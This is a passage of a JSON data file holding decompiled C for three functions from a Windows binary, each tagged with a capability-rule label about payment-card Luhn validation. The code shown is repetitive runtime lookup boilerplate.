        "decompiled_code": "\nint32_t * fcn.004a0960(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffd48;\n    int32_t in_stack_fffffd4c;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50714c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50716c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507178, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdb8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd9c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd9c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd80 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd80 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd64 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd64 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd4c = 0x507724;\n        in_stack_fffffd48 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffd4c != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffd4c);\n        fcn.0049e080(in_stack_fffffd48, in_stack_fffffd4c, arg_10h);\n        return in_stack_fffffd48;\n    }\n    fcn.0049c600(*(in_stack_fffffd48 + *(*in_stack_fffffd48 + -0xc) + 0x14) | 1);\n    return in_stack_fffffd48;\n}\n",
        "token_count": 4819
    },
    "004a0a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0a80(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffd9c;\n    int32_t in_stack_fffffda0;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdb8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffda0 = 0x507724;\n        in_stack_fffffd9c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffda0 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffda0);\n        fcn.0049e080(in_stack_fffffd9c, in_stack_fffffda0, arg_10h);\n        return in_stack_fffffd9c;\n    }\n    fcn.0049c600(*(in_stack_fffffd9c + *(*in_stack_fffffd9c + -0xc) + 0x14) | 1);\n    return in_stack_fffffd9c;\n}\n",
        "token_count": 4269
    },
    "004a0ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0ae0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffdb8;\n    int32_t in_stack_fffffdbc;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 